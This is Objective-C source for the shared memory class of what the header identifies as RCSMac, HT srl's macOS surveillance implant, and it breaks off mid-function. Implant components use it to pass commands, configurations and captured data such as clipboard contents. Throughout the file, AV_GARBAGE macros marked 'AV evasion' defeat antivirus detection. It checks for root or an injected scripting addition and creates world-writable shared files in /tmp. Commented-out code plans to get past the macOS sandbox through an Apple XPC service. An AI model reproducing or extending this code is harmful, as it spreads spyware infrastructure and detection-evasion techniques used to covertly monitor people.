/*
 * RCSMac - Shared Memory Class
 *  Wrapper around <shm.h> and <semaphore.h>
 *
 * [QUICK TODO]
 * - Move all the ERRORS #define in a common place
 *
 * Created by Alfredo 'revenge' Pesoli on 26/03/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <sys/errno.h>
#import <sys/shm.h>
#import <dlfcn.h>
#import <sys/mman.h>


#import "RCSMCommon.h"
#import "RCSMSharedMemory.h"

#import "RCSMDebug.h"
#import "RCSMLogger.h"

#import "RCSMAVGarbage.h"

// access permissions on shared memory 0666
#define GLOBAL_PERMISSIONS 0666

// error strings
#define EUNKNOWN_STR  "Unknown Error occured"
#define ENOSPC_STR    "All possible shared memory IDs are allocated"
#define ENOMEM_STR    "Allocating requested size would exceed the limit on shared memory"
#define EACCES_STR    "You do not have access permission"
#define EINVAL_STR    "Invalid segment size specified"
#define EINVAL_STR2   "Not a valid memory identifier"
#define EMFILE_STR    "The number of shared memory segments has reached it's limit"

#pragma mark -
#pragma mark Implementation
#pragma mark -

static time_t testPreviousTime = 0;

// function pointers for dinamic linking on 10.7
//static BOOL (*_sandbox_check)(pid_t pid, int type, int operation) = NULL;

//static const struct _xpc_type_s *__xpc_type_dictionary;
//static const struct _xpc_type_s *__xpc_type_error;
//static struct _xpc_dictionary_s *__xpc_error_connection_interrupted;
//static struct _xpc_dictionary_s *__xpc_error_connection_invalid;
//
//static xpc_object_t (*_xpc_dictionary_create)(const char **, const xpc_object_t *, size_t) = NULL;
//static xpc_object_t (*_xpc_int64_create)(uint64_t) = NULL;
//static xpc_object_t (*_xpc_data_create)(const void *, size_t) = NULL;
//
//static const void *(*_xpc_dictionary_get_data)(xpc_object_t, const char *, size_t *) = NULL;
//static void (*_xpc_dictionary_set_value)(xpc_object_t , const char *, xpc_object_t) = NULL;
//
//static xpc_type_t (*_xpc_get_type)(xpc_object_t) = NULL;
//
//static xpc_connection_t (*_xpc_connection_create)(const char *, dispatch_queue_t) = NULL;
//static void (*_xpc_connection_resume)(xpc_connection_t) = NULL;
//static void (*_xpc_connection_set_event_handler)(xpc_connection_t, xpc_handler_t) = NULL;
//static void (*_xpc_connection_send_message_with_reply)(xpc_connection_t, 
//                                                       xpc_object_t, 
//                                                       dispatch_queue_t, 
//                                                       xpc_handler_t) = NULL;
//static xpc_object_t (*_xpc_connection_send_message_with_reply_sync)(xpc_connection_t, xpc_object_t);
//static void (*_xpc_release)(xpc_object_t) = NULL;
//

// Building on sdk < 10.7 
//static BOOL resolveXpcFunc()
//{
//  void *libsystem = dlopen("/usr/lib/libSystem.dylib", RTLD_NOW);
//
//  if (libsystem == NULL) 
//    {
//#ifdef DEBUG_SHMEM
//      infoLog(@"error on loading library libSystem");
//#endif
//      return NO;
//    }
//
//  __xpc_type_error = dlsym(libsystem, "_xpc_type_error");
//  __xpc_type_dictionary = dlsym(libsystem, "_xpc_type_dictionary");
//  __xpc_error_connection_invalid = dlsym(libsystem, "_xpc_error_connection_invalid");
//  __xpc_error_connection_interrupted = dlsym(libsystem, "_xpc_error_connection_interrupted");
//
//  _xpc_dictionary_create = dlsym(libsystem, "xpc_dictionary_create");
//  _xpc_int64_create = dlsym(libsystem, "xpc_int64_create");
//  _xpc_data_create = dlsym(libsystem, "xpc_data_create");
//
//  _xpc_dictionary_get_data = dlsym(libsystem, "xpc_dictionary_get_data");
//  _xpc_dictionary_set_value = dlsym(libsystem, "xpc_dictionary_set_value");
//  _xpc_get_type = dlsym(libsystem, "xpc_get_type");
//
//  _xpc_connection_create = dlsym(libsystem, "xpc_connection_create");
//  _xpc_connection_resume = dlsym(libsystem, "xpc_connection_resume");
//  _xpc_connection_set_event_handler = dlsym(libsystem, "xpc_connection_set_event_handler");
//  _xpc_connection_send_message_with_reply = dlsym(libsystem, "xpc_connection_send_message_with_reply");
//  _xpc_connection_send_message_with_reply_sync = dlsym(libsystem, "xpc_connection_send_message_with_reply_sync");
//  _xpc_release = dlsym(libsystem, "xpc_release");
//
//  if (_xpc_dictionary_create == NULL ||
//      _xpc_int64_create == NULL ||
//      _xpc_data_create == NULL ||
//      _xpc_dictionary_get_data == NULL ||
//      _xpc_dictionary_set_value == NULL ||
//      _xpc_get_type == NULL ||
//      _xpc_connection_create == NULL ||
//      _xpc_connection_set_event_handler == NULL ||
//      _xpc_connection_send_message_with_reply == NULL ||
//      _xpc_connection_send_message_with_reply_sync == NULL ||
//      _xpc_release == NULL) 
//    {
//#ifdef DEBUG_SHMEM
//      infoLog(@"error resolving xpc sym");
//#endif
//      return NO;
//    }
//
//  void *sndbox = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW);
//
//  if (sndbox != NULL) 
//    _sandbox_check = dlsym(sndbox, "sandbox_check");
//
//  if (_sandbox_check == NULL)
//    {
//#ifdef DEBUG_SHMEM
//      infoLog(@"error resolving sndbox_check sym");
//#endif
//      return NO;
//    }
//
//  return YES;
//}

//static BOOL sandbox_compatibility(pid_t pid, int operation, int type)
//{
//  BOOL bRet = FALSE;
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_001
//  
//  if (resolveXpcFunc() == NO) 
//    {
//#ifdef DEBUG_SHMEM
//      infoLog(@"error resolving xpc function addresses");
//#endif
//      return bRet;
//    }
//  else
//    {
//#ifdef  DEBUG_SHMEM
//      infoLog(@" xpc function resolved");
//#endif
//    }
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_004
//  
//  bRet = _sandbox_check(pid, operation, type);
//
//#ifdef  DEBUG_SHMEM
//  infoLog(@"Application sanboxed %d", bRet);
//#endif
//
//  return bRet;
//}

static BOOL amIPrivileged()
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  BOOL bRet = FALSE;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (getuid() == 0 || geteuid() == 0) 
    bRet = TRUE;
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      NSString *appleHID = [[NSString alloc] initWithFormat: @"/%@/%@/%@", LIBRARY_NSSTRING, OSAX_FOLDER, OSAX_NAME];

      bRet = [[NSFileManager defaultManager] fileExistsAtPath: appleHID];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      [appleHID release];
    }
  
  [pool release];
 
  return bRet;
}

@implementation __m_MSharedMemory

- (id)initWithKey: (int)aKey
             size: (int)aSize
    semaphoreName: (NSString *)aSemaphoreName
{
  if (self = [super init])
    {
      // TODO: Fix SemaphoreID
      mSharedMemory  = NULL;
      mSemaphoreID   = 0;
      mKey           = aKey;
      mSize          = aSize;
      mSemaphoreName = [aSemaphoreName copy];
//      amISandboxed   = sandbox_compatibility(getpid(),0 ,0);
      mAmIPrivUser   = amIPrivileged();
    }
  
  return self;
}

- (void)dealloc
{
  if ([self detachFromMemoryRegion] == 0)
    {
      if (sem_close(mSemaphoreID) == 0)
        {
#ifdef DEBUG_SHMEM
          infoLog(@"Semaphore closed correctly");
#endif
        }
    }
  
  [mSemaphoreName release];
  [super dealloc];
}

- (void)removeMappedFile
{
  if (mAmIPrivUser)
    return;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == TRUE)
  {
    [[NSFileManager defaultManager] removeItemAtPath: tmpFileName error: nil];
  }
}

//- (char *)_guessXPCServiceName: (NSString*)aPath
//{
//  char *retString = NULL;
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_003
//  
//  NSFileManager *localFileManager = [NSFileManager defaultManager];
//  NSDirectoryEnumerator *dirEnum  = [localFileManager enumeratorAtPath: aPath];
//  
//  NSString *_file;
//  
//  while (_file = [dirEnum nextObject]) 
//    {
//      if ([_file hasPrefix: XPC_BUNDLE_FOLDER_PREFIX]) 
//        {
//#ifdef DEBUG_SHMEM
//          //infoLog(@"%s: found xpc service with name %@", __FUNCTION__, _file);
//#endif
//          
//          // AV evasion: only on release build
//          AV_GARBAGE_002
//          
//          retString = (char*)[_file UTF8String];
//
//          retString[strlen(retString) - 4] = 0;
//
//          
//          // AV evasion: only on release build
//          AV_GARBAGE_001
//          
//          return retString;
//        }
//    }
//  
//  return retString;
//}

- (void)zeroFillMemory
{
  if (mSharedMemory)
    memset(mSharedMemory, '\0', mSize);
}

- (int)detachFromMemoryRegion
{
  struct shmid_ds SharedMemDS;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // if sanboxed do nothing...
//  if (amISandboxed)
//    return 0;
  if (mAmIPrivUser)
  {  
    // AV evasion: only on release build
    AV_GARBAGE_001
    
      if (shmdt(mSharedMemory) != -1)
      {  
        // AV evasion: only on release build
        AV_GARBAGE_002
        
          shmctl([self mSharedMemoryID], IPC_STAT, &SharedMemDS);

          // Check if there's anything still attached to the region
          if (SharedMemDS.shm_nattch == 0)
            {
              // Remove the segment in order to free the key and memory
              shmctl(mSharedMemoryID, IPC_RMID, NULL);
#ifdef DEBUG_SHMEM
              infoLog(@"Shared Memory (%d) destroyed", mSharedMemoryID);
#endif
            }
          else
            {
#ifdef DEBUG_SHMEM
              infoLog(@"We have still someone attached here dude, can't destroy");
#endif
              //shmctl(mSharedMemoryID, IPC_RMID, NULL);
            }
        }
      else
        return -1;
    }
  else
  {  
    // AV evasion: only on release build
    AV_GARBAGE_001
    
      munmap(mSharedMemory, mSize);
      close(mSharedMemoryID);
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  return 0;
}

- (int)attachToMemoryRegion
{  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // If sandboxed to nothing...
//  if (amISandboxed == NO) 
//  { 
    if (mAmIPrivUser)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      mSharedMemory = shmat(mSharedMemoryID, 0, GLOBAL_PERMISSIONS);
      
      if (mSharedMemory == NULL)
      {
#ifdef DEBUG_SHMEM
        char *error = NULL;
        switch (errno)
        {
          case EACCES: error = EACCES_STR; break;
          case ENOMEM: error = ENOMEM_STR; break;
          case EINVAL: error = EINVAL_STR2; break;
          case EMFILE: error = EMFILE_STR; break;
          default:     error = EUNKNOWN_STR;
        }
        
        infoLog(@"Error shmat: %s", error);
#endif
        
        return -1;
      }
    }
    else
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      mSharedMemory = mmap(NULL, mSize, PROT_READ|PROT_WRITE, MAP_FILE|MAP_SHARED, mSharedMemoryID, 0);
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      if (mSharedMemory == NULL)
      {
        return -1;
      }
//    }
    
#ifdef DEBUG_SHMEM
    infoLog(@"ptrSharedMemory: 0x%08x", mSharedMemory);
#endif
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    mSemaphoreID = sem_open((const char *)mSemaphoreName, 
                            O_CREAT,
                            GLOBAL_PERMISSIONS,
                            1);
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    if ((int *)mSemaphoreID == SEM_FAILED)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"An error occured while opening semaphore in sem_open()");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      if (mAmIPrivUser)
        shmdt(mSharedMemory);
      
      return -1;
    } 
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  return 0;
}

- (int)createMemoryRegion
{  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // If sandboxed read shmem by xpc service
//  if (amISandboxed) 
//  {
//    char *service_name = "com.apple.mdworker_server";
//    //[self _guessXPCServiceName: XPC_BUNDLE_FRAMEWORK_PATH];
//    
//    if (service_name == NULL) 
//    {
//#ifdef  DEBUG_SHMEM
//      //infoLog(@"%s: error getting service name", __FUNCTION__);
//#endif
//      return -1;
//    }
//    else
//    {
//#ifdef  DEBUG_SHMEM
//      //infoLog(@"%s: setting service name %s", __FUNCTION__, service_name);
//#endif
//    }
//    
//    // AV evasion: only on release build
//    AV_GARBAGE_003
//    
//    xpc_handler_t handler = (^(xpc_object_t event) 
//                             {
//                               xpc_type_t type = _xpc_get_type(event);
//                               
//                               if (type == __xpc_type_error) 
//                               {
//#ifdef DEBUG_SHMEM
//                                 //infoLog(@"error cannot continue!");
//#endif
//                               }
//                             });
//    
//    // AV evasion: only on release build
//    AV_GARBAGE_001
//    
//    mXpcCon = _xpc_connection_create("com.apple.mdworker_server", NULL);
//    
//    _xpc_connection_set_event_handler(mXpcCon, handler);
//    
//    _xpc_connection_resume(mXpcCon);
//    
//    return 0;  
//  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (mAmIPrivUser)
  {
    mSharedMemoryID = shmget(mKey, mSize, IPC_CREAT | GLOBAL_PERMISSIONS);
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    if (mSharedMemoryID == -1)
    {
#ifdef DEBUG_SHMEM
      char *error = NULL;
      switch (errno)
      {
        case ENOSPC: error = ENOSPC_STR; break;
        case ENOMEM: error = ENOMEM_STR; break;
        case EACCES: error = EACCES_STR; break;
        case EINVAL: error = EINVAL_STR; break;
          //case EEXIST: return -2;
        default:     error = EUNKNOWN_STR;
      }
      
      infoLog(@"Error shmget: %s", error);
#endif
      
      return -1;
    }
  }
  else
  {  
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    // create a tmp file for shmem
    NSString *tmpFileName = [[NSString alloc] initWithFormat: @"/tmp/launchch-%d", mKey];
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    if ([[NSFileManager defaultManager] fileExistsAtPath: tmpFileName] == FALSE)
    {
      int intZero = 0;
      mSharedMemoryID = open([tmpFileName UTF8String], 
                             O_CREAT|O_RDWR, 
                             S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
      
      // AV evasion: only on release build
      AV_GARBAGE_009
      
      // create/rewrite the file, mSharedMemory read fail if not
      if (mSharedMemoryID != -1)
      {
        for (int i=0; i<mSize; i+=sizeof(intZero))
          write(mSharedMemoryID, &intZero, sizeof(intZero));
      }
    }
    else
      mSharedMemoryID = open([tmpFileName UTF8String], 
                             O_RDWR, 
                             S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH);
    
    if (mSharedMemoryID == -1)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return -1;
    }
  }
  
#ifdef DEBUG_SHMEM
  infoLog(@"SharedMemoryID: %d", mSharedMemoryID);
  infoLog(@"Key: %d", mKey);
  infoLog(@"Size: %d", mSize);
#endif
  
  return 0;
}

- (BOOL)clearConfigurations
{
  u_int offset              = 0;
  shMemoryLog *memoryHeader = NULL;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
//  if (amISandboxed)
//    return TRUE;
  
  if (mSize < mSize)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"[EE] clearConfigurations can't be used on the command queue");
#endif      
      return FALSE;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  do
    {
      memoryHeader        = (shMemoryLog *)(mSharedMemory + offset);
      int tmpAgentID      = memoryHeader->agentID;
      int tmpCommandType  = memoryHeader->commandType;

      if (tmpAgentID != 0
          && tmpCommandType == CM_AGENT_CONF)
        {
          memset((void *)(mSharedMemory + offset), '\0', sizeof(shMemoryLog));
        }
      else
        {
          // Not found
          offset += sizeof (shMemoryLog);
        }
    }
  while (offset < mSize);
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  return TRUE;
}

- (void)_unlockShmem
{
  if (mAmIPrivUser == NO)
    sem_post(mSemaphoreID);
}

- (void)_lockShmem
{
  if (mAmIPrivUser == NO)
    if (sem_wait(mSemaphoreID) != 0) 
      return;
}

//- (BOOL)writeMemorybyXPC: (NSData *)aData
//                  offset: (u_int)anOffset
//           fromComponent: (u_int)aComponent
//{  
//  // AV evasion: only on release build
//  AV_GARBAGE_001
//  
//  xpc_object_t reply;
//  BOOL bRet = FALSE;
//  
//  if (aData == nil || 
//      [aData length] == 0)
//  {
//#ifdef DEBUG_SHMEM
//    infoLog(@"[XPC __m_MSharedMemory] write memory with aData = nil");
//#endif
//    return bRet;
//  }
//  else
//  {
//#ifdef DEBUG_SHMEM
//    infoLog(@"[XPC __m_MSharedMemory] writeMemorybyXPC....");
//#endif
//  }
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_006
//  
//  // Write command
//  xpc_object_t cmd  = _xpc_int64_create(WRITE_XPC_CMD);
//  xpc_object_t off  = _xpc_int64_create(anOffset);
//  xpc_object_t cmp  = _xpc_int64_create(aComponent);
//  xpc_object_t data = _xpc_data_create([aData bytes], [aData length]);
//  
//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
//  
//  _xpc_dictionary_set_value(message, "command", cmd);
//  _xpc_dictionary_set_value(message, "offset", off);
//  _xpc_dictionary_set_value(message, "component", cmp);
//  _xpc_dictionary_set_value(message, "data", data);
//  
//  reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_003
//  
//  if (reply != NULL) 
//  {
//    xpc_type_t type = _xpc_get_type(reply);
//    
//    if (type == __xpc_type_error) 
//    {
//      if (reply == __xpc_error_connection_interrupted) 
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@"xpc error connection interrupted");
//#endif
//      } 
//      else if (reply == __xpc_error_connection_invalid) 
//      {            
//#ifdef DEBUG_SHMEM
//        infoLog(@"xpc error connection invalid");
//#endif
//      }
//    } 
//    else if (type == __xpc_type_dictionary) 
//    { 
//      unsigned long len = 0;
//      char *buff = NULL;
//      
//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
//      
//      if (buff == NULL || len == 0)
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@"xpc error getting raw data");
//#endif
//      }
//      else
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@"xpc getting raw data len %lu", len);
//#endif
//        memcpy(&bRet, buff, sizeof(bRet));
//      }
//    }
//  }
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_006
//  
//  _xpc_release(message);
//  
//  return bRet;
//}

//- (NSMutableData*)readMemoryByXPC:(u_int)anOffset 
//                    fromComponent:(u_int)aComponent
//{
//  NSMutableData *xpcReplyData = nil;
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_001
//  
//  // reading command
//  xpc_object_t cmd = _xpc_int64_create(READ_XPC_CMD);
//  xpc_object_t off = _xpc_int64_create(anOffset);
//  xpc_object_t cmp = _xpc_int64_create(aComponent);
//  
//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
//  
//  _xpc_dictionary_set_value(message, "command", cmd);
//  _xpc_dictionary_set_value(message, "offset", off);
//  _xpc_dictionary_set_value(message, "component", cmp);
//  
//  // blocking send message
//  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_008
//  
//  if (reply != NULL)
//  {
//    xpc_type_t type = _xpc_get_type(reply);
//    
//    if (type == __xpc_type_error) 
//    {
//      if (reply == __xpc_error_connection_interrupted) 
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
//#endif
//      } 
//      else if (reply == __xpc_error_connection_invalid) 
//      {            
//#ifdef DEBUG_SHMEM
//        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
//#endif
//      }
//    } 
//    else if (type == __xpc_type_dictionary) 
//    { 
//      unsigned long len;
//      char *buff;
//      
//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
//      
//      if (buff == NULL)
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
//#endif
//      }
//      else
//      {
//        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
//                                                     length:len];
//#ifdef DEBUG_SHMEM
//        if (anOffset == OFFT_CLIPBOARD)
//        {
//          infoLog(@"[XPC __m_MSharedMemory] read memory at off %#x", anOffset);
//          
//          shMemoryCommand *cmd = (shMemoryCommand*)buff;
//          
//          infoLog(@"[XPC __m_MSharedMemory] agentID %#x cmd %#x", cmd->agentID, cmd->command);
//        }
//#endif
//      }
//    }
//  }
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_007
//  
//  _xpc_release(message);
//  
//  return xpcReplyData;
//}

//- (NSMutableData *)readMemoryByXPCFromComponent: (u_int)aComponent
//                                       forAgent: (u_int)anAgentID
//                                withCommandType: (u_int)aCommandType
//
//{
//  NSMutableData *xpcReplyData = nil;
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_001
//  
//  // reading command
//  xpc_object_t cmd = _xpc_int64_create(READ_XPC_COMP_CMD);
//  xpc_object_t cmp = _xpc_int64_create(aComponent);
//  xpc_object_t agt = _xpc_int64_create(anAgentID);
//  xpc_object_t typ = _xpc_int64_create(aCommandType);
//  
//  xpc_object_t message = _xpc_dictionary_create(NULL, NULL, 0);
//  
//  _xpc_dictionary_set_value(message, "command", cmd);
//  _xpc_dictionary_set_value(message, "component", cmp);
//  _xpc_dictionary_set_value(message, "agent", agt);
//  _xpc_dictionary_set_value(message, "type", typ);
//  
//  
//  // blocking send message
//  xpc_object_t reply = _xpc_connection_send_message_with_reply_sync(mXpcCon, message);
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_004
//  
//  if (reply != NULL)
//  {
//    xpc_type_t type = _xpc_get_type(reply);
//    
//    if (type == __xpc_type_error) 
//    {
//      if (reply == __xpc_error_connection_interrupted) 
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@" [XPC __m_MSharedMemory] xpc error connection interrupted");
//#endif
//      } 
//      else if (reply == __xpc_error_connection_invalid) 
//      {            
//#ifdef DEBUG_SHMEM
//        infoLog(@"[XPC __m_MSharedMemory] xpc error connection invalid");
//#endif
//      }
//    } 
//    else if (type == __xpc_type_dictionary) 
//    { 
//      unsigned long len;
//      char *buff;
//      
//      buff = (char*)_xpc_dictionary_get_data(reply, "data", &len);
//      
//      if (buff == NULL)
//      {
//#ifdef DEBUG_SHMEM
//        infoLog(@"[XPC __m_MSharedMemory] xpc error getting raw data");
//#endif
//      }
//      else
//      {
//        xpcReplyData = [[NSMutableData alloc] initWithBytes:buff 
//                                                     length:len];
//      }
//    }
//  }
//  
//  // AV evasion: only on release build
//  AV_GARBAGE_008
//  
//  _xpc_release(message);
//  
//  return xpcReplyData;
//}

- (NSMutableData *)readMemoryFromComponent: (u_int)aComponent
                                  forAgent: (u_int)anAgentID
                           withCommandType: (u_int)aCommandType
{
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *readData = nil;
  shMemoryLog *tempHeader = NULL;
  
  // if sandboxed read shmem by xpc api
//  if (amISandboxed)
//  {
//    readData = [self readMemoryByXPCFromComponent: aComponent 
//                                         forAgent: anAgentID 
//                                  withCommandType: aCommandType];  
//    
//    return readData;
//  }
  
  BOOL lookForAgent       = NO;
  BOOL foundAgent         = NO;
  BOOL lookForCommand     = NO;
  BOOL foundCommand       = NO;
  BOOL blockFound         = NO;
  BOOL blockMatched       = NO;
  
  u_int offset            = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
  {
#ifdef DEBUG_SHMEM
    infoLog(@"[EE] readMemory-log unsupported component");
#endif
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (anAgentID == 0 && aCommandType == 0)
  {
#ifdef DEBUG_SHMEM
    infoLog(@"[EE] readMemory-log usupported read");
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (aCommandType != 0)
  {
    lookForCommand = YES;
  }
  if (anAgentID != 0)
  {
    lookForAgent = YES;
  }
  
  time_t lowestTimestamp      = 0;
  u_int  matchingObjectOffset = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  //
  // Find the first available block who matches our request
  //
  do
  {
    tempHeader = (shMemoryLog *)(mSharedMemory + offset);
    int tempState       = tempHeader->status;
    int tmpAgentID      = tempHeader->agentID;
    int tmpCommandType  = tempHeader->commandType;
    int tmpDirection    = tempHeader->direction;
    
    if (tempState == SHMEM_FREE)
    {
      offset += sizeof (shMemoryLog);
      continue;
    }
    
    if (tempState == SHMEM_LOCKED)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"ANOMALY! FOUND LOCKED BLOCK ON READ");
#endif
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    if (lookForCommand == YES)
    {
      if (((aCommandType & tmpCommandType) == tmpCommandType)
          && tmpCommandType != 0)
      {
        foundCommand = YES;
      }
    }
    if (lookForAgent == YES)
    {
      if (tmpAgentID == anAgentID)
      {
        foundAgent = YES;
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    // Looking only for commandType
    if ((lookForCommand == YES && foundCommand == YES)
        && lookForAgent == NO)
      blockFound = YES;
    
    // Looking only for agentID
    if ((lookForAgent     == YES && foundAgent == YES)
        && lookForCommand == NO)
      blockFound = YES;
    
    // Looking for both
    if ((lookForCommand  == YES && foundCommand == YES)
        && (lookForAgent == YES && foundAgent   == YES))
      blockFound = YES;
    
    // AV evasion: only on release build
    AV_GARBAGE_002
    
    if (blockFound == YES)
    {
      if ((tmpDirection ^ aComponent) == 0)
      {
#ifdef DEBUG_SHMEM
        infoLog(@"[ii] Found data matching our request on shmem");
#endif
        
        blockMatched = YES;
        
        if (lowestTimestamp == 0)
        {
          lowestTimestamp = tempHeader->timestamp;
          matchingObjectOffset = offset;
        }
        else if (tempHeader->timestamp < lowestTimestamp)
        {
          lowestTimestamp = tempHeader->timestamp;
          matchingObjectOffset = offset;
        }
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_003
    
    offset += sizeof (shMemoryLog);
    
    foundCommand = NO;
    foundAgent   = NO;
    blockFound   = NO;
  }
  while (offset < mSize);
  
  if (blockMatched == YES)
  {
    //infoLog(@"lowest Timestamp: %x", lowestTimestamp);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    if (testPreviousTime != 0)
    {
      if (lowestTimestamp < testPreviousTime)
      {
#ifdef DEBUG_SHMEM
        infoLog(@"ANOMALY DETECTED in shared memory!");
        infoLog(@"previousTimestamp: %x", testPreviousTime);
        infoLog(@"lowestTimestamp  : %x", lowestTimestamp);
#endif
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    testPreviousTime = lowestTimestamp;
    readData = [[NSMutableData alloc] initWithBytes: (char *)(mSharedMemory + matchingObjectOffset)
                                             length: sizeof(shMemoryLog)];
    
    if (aCommandType != CM_AGENT_CONF)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      memset((char *)(mSharedMemory + matchingObjectOffset), '\0', sizeof(shMemoryLog));
    }
  }
  else
  {
    //infoLog(@"block not found while reading!!!!!");
    
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return readData;
}

- (NSMutableData *)readMemory: (u_int)anOffset
                fromComponent: (u_int)aComponent
{  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *readData = nil;
  
  // if sandboxed read shmem by xpc api
//  if (amISandboxed)
//  {
//    readData = [self readMemoryByXPC: anOffset 
//                       fromComponent: aComponent];  
//    
//    return [readData autorelease];
//  }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  shMemoryCommand *memoryHeader = (shMemoryCommand *)(mSharedMemory + anOffset);
  
  if (aComponent != COMP_CORE && aComponent != COMP_AGENT)
  {
#ifdef DEBUG_SHMEM
    infoLog(@"[EE] readMemory-command unsupported component");
#endif
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if (anOffset == 0)
  {
#ifdef DEBUG_SHMEM
    infoLog(@"[EE] readMemory-command offset is zero");
#endif
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  if (memoryHeader->agentID != 0)
  {
    //
    // Now if who is reading is the same as who this data is directed to,
    // read it and clean out the area
    //
    if ((aComponent ^ memoryHeader->direction) == 0)
    {
#ifdef DEBUG_SHMEM
      infoLog(@"Found data on shared memory");
#endif
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      readData = [[NSMutableData alloc] initWithBytes: mSharedMemory + anOffset
                                               length: sizeof(shMemoryCommand)];
      
      //memset((void *)(mSharedMemory + anOffset), '\0', sizeof(shMemoryCommand));
    }
  }
  
  return [readData autorelease];
}

- (BOOL)writeMemory: (NSData *)aData
             offset: (u_int)anOffset
      fromComponent: (u_int)aComponent
{
  int memoryState = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
//  // Do it by xpc service
//  if (amISandboxed) 
//    return [self writeMemorybyXPC:aData offset:anOffset fromComponent:aComponent];
  
  //
  // In case we receive 0 as offset it means that we're dealing within the logs
  // shared memory, thus we need to find the first available block (not written)
  //
  if (anOffset == 0 || anOffset == 1)
  {
    if (anOffset == 1)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [self zeroFillMemory];
      anOffset = 0;
    }
    
    [self _lockShmem];
    
    do
    {
      memoryState = *(unsigned int *)(mSharedMemory + anOffset);
      
      if (memoryState != SHMEM_FREE)
      {
        anOffset += sizeof (shMemoryLog);
      }
      else
      {
        memoryState = SHMEM_LOCKED;
        break;
      }
      
      if (anOffset >= mSize)
      {
#ifdef DEBUG_SHMEM
        infoLog(@"[XPC __m_MSharedMemory] SHMem - write didn't found an available memory block mSize = %#x", mSize);
#endif
        return FALSE;
      }
    }
    while (memoryState != SHMEM_FREE);
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
